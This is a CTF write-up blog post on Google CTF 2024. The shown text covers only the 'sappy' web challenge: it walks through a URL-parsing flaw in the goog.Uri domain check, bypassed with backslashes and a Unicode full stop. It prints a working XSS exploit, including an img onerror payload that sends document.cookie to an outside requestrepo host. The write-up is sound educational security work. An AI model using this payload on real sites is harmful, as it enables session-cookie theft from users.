---
title: 'Google CTF 2024'
description: 'Write-ups for the web + hackceler8 challenges at Google CTF 2024.'
date: 2024-06-30T00:00:00Z
---

Last week I played Google CTF with Zer0RocketWrecks (merger between Zer0Tolerance, RedRocket and my team WreckTheLine). We managed to get 3rd place, with only 5 challenges remaining unsolved (out of 30). Looking forward to next year already!

![](/assets/images/posts/googlectf2024.png)

Pretty happy we managed to actually solve all the web challenges this year, as well as the hackceler8 challenges. Here are my write-ups:

* [sappy (174 pts, 64 solves) - Web](#sappy)
* [grand prix heaven (169 pts, 67 solves) - Web](#grand-prix-heaven)
* [game arcade (333 pts, 14 solves) - Web](#game-arcade)
* [postviewer v3 (303 pts, 19 solves) - Web](#postviewer-v3)
* [in-the-shadows (420 pts, 5 solves) - Web](#in-the-shadows)
* [hx8 teaser 1 (174 pts, 64 solves) - Misc](#hx8-teaser-1)
* [hx8 teaser 2 (174 pts, 64 solves) - Misc](#hx8-teaser-2)

<a name="sappy"></a>
## sappy (174 pts, 64 solves) - Web

Description:
```
I am a beginner programmer and I share what I learnt about JavaScript with the world!

Note: Flag is in the cookie

URL: https://sappy-web.2024.ctfcompetition.com/
```

We are given the source code of the application. A few things stand out from the start: 
- There is a report URL functionality, so the challenge is most likely to be XSS
- The application uses [shims](https://en.wikipedia.org/wiki/Shim_(computing)) on the same origin to display content

With those 2 in mind, we should look at how the shim is actually implemented:

```javascript
      function onIframeLoad() {
        iframe.contentWindow.postMessage(
          `
            {
                "method": "initialize", 
                "host": "https://sappy-web.2024.ctfcompetition.com"
            }`,
          window.origin
        );
      }
```

index.html sets up the shim at load time with the host `https://sappy-web.2024.ctfcompetition.com`, which is the origin of the challenge. This is the javascript code of the shim:
```javascript
goog.module("sap");

const Uri = goog.require("goog.Uri");

function getHost(options) {
  if (!options.host) {
    const u = Uri.parse(document.location);

    return u.scheme + "://sappy-web.2024.ctfcompetition.com";
  }
  return validate(options.host);
}

function validate(host) {
  const h = Uri.parse(host);
  if (h.hasQuery()) {
    throw "invalid host";
  }
  if (h.getDomain() !== "sappy-web.2024.ctfcompetition.com") {
    throw "invalid host";
  }
  return host;
}

function buildUrl(options) {
  return getHost(options) + "/sap/" + options.page;
}

exports = { buildUrl };

window.buildUrl = buildUrl;

const API = { host: location.origin };

const output = document.getElementById("output");

window.addEventListener(
  "message",
  async (event) => {
    let data = event.data;
    if (typeof data !== "string") return;
    data = JSON.parse(data);
    const method = data.method;
    switch (method) {
      case "initialize": {
        if (!data.host) return;
        API.host = data.host;
        break;
      }
      case "render": {
        if (typeof data.page !== "string") return;
        const url = buildUrl({
          host: API.host,
          page: data.page,
        });
        const resp = await fetch(url);
        if (resp.status !== 200) {
          console.error("something went wrong");
          return;
        }
        const json = await resp.json();
        if (typeof json.html === "string") {
          output.innerHTML = json.html;
        }
        break;
      }
    }
  },
  false
);
```

Looks pretty secure at a first glance. You can initialize the shim with any `API.host` you want, but when the `buildUrl` function is called, it uses `goog.Uri` to validate that the domain is indeed `sappy-web.2024.ctfcompetition.com`. As a side note, I find it very cool that Google CTF showcases some Google products that are not necessarily secure :)

**Url parsing differential:** From this point forward it seems pretty clear, we need a way to trick the fetch into requesting a resource that we own (from there the attack is trivial, since it uses innerHTML we can just inject an img tag with onerror attribute to get the cookie).

Looking into the code of [https://github.com/google/closure-library/blob/master/closure/goog/uri/utils.js#L189](goog.Uri):

```javascript
goog.uri.utils.splitRe_ = new RegExp(
    '^' +  // Anchor against the entire string.
    '(?:' +
    '([^:/?#.]+)' +  // scheme - ignore special characters
                     // used by other URL parts such as :,
                     // ?, /, #, and .
    ':)?' +
    '(?://' +
    '(?:([^\\\\/?#]*)@)?' +  // userInfo
    '([^\\\\/?#]*?)' +       // domain
    '(?::([0-9]+))?' +       // port
    '(?=[\\\\/?#]|$)' +      // authority-terminating character.
    ')?' +
    '([^?#]+)?' +          // path
    '(?:\\?([^#]*))?' +    // query
    '(?:#([\\s\\S]*))?' +  // fragment. Can't use '.*' with 's' flag as Firefox
                           // doesn't support the flag, and can't use an
                           // "everything set" ([^]) as IE10 doesn't match any
                           // characters with it.
    '$');
```

When I saw that it's using regex to parse the URL, I immediately thought of this [StackOverflow answer](https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags#1732454) (I know it's about html, but I think the same applies to URLs as well):
![](/assets/images/posts/regex.png)

In my approach, I decided to abuse the weak regex of `scheme`, in order to have my domain in there. As we can see, the group looks for characters that are not `:/?#.`. But fetch also accepts using backslashes instead of slashes:

```javascript
goog.Uri.parse('\\\\2130706433\\://sappy-web.2024.ctfcompetition.com')
<- goog.Uri {scheme_: '\\\\2130706433\\', userInfo_: '', domain_: 'sappy-web.2024.ctfcompetition.com', port_: null, path_: '', …}
// but fetch will request 2130706433 (localhost in decimal)
fetch('\\\\2130706433\\://sappy-web.2024.ctfcompetition.com')
'GET https://127.0.0.1/://sappy-web.2024.ctfcompetition.com net::ERR_CONNECTION_REFUSED'
```

This was my payload at first. But it didn't work, because starting an url with `//` or `\\` will keep the same schema as the website, which in this case is https. So I either had to find an open redirect in `1.1.1.1`/`8.8.8.8`, buy a certificate for my IP (expensive), or find another way.

**Unicode to the rescue:** Turns out this character `。` (\u3002) actually gets normalized to a simple dot by the browser. I found that by browsing for [old writeups](https://ctftime.org/writeup/10559) (thanks Real World CTF / p4).

So now I can use requestrepo without having to worry about certificates. One nice thing is that headless chrome doesn't need confirmation to open new windows, so we can get the cookie without worrying about iframes:
```html
<script>
  let win = open("https://sappy-web.2024.ctfcompetition.com/sap.html");
  setTimeout(()=> {
    win.postMessage(JSON.stringify({"method":"initialize", "host":"\\\\eqadvjoy\u3002requestrepo\u3002com\\://sappy-web.2024.ctfcompetition.com/asdf"}),'*');
    setTimeout(() => {
      win.postMessage(JSON.stringify({"method":"render", "page":"exp"}),'*');
    }, 200);
  }, 500);
</script>
```

and on eqadvjoy.requestrepo.com:

```javascript
{"html":"<img src=x onerror=fetch(`//eqadvjoy.requestrepo.com`,{method:`POST`,body:document.cookie}); />"}
```

And we get the flag:

**CTF{parsing_urls_is_always_super_tricky}**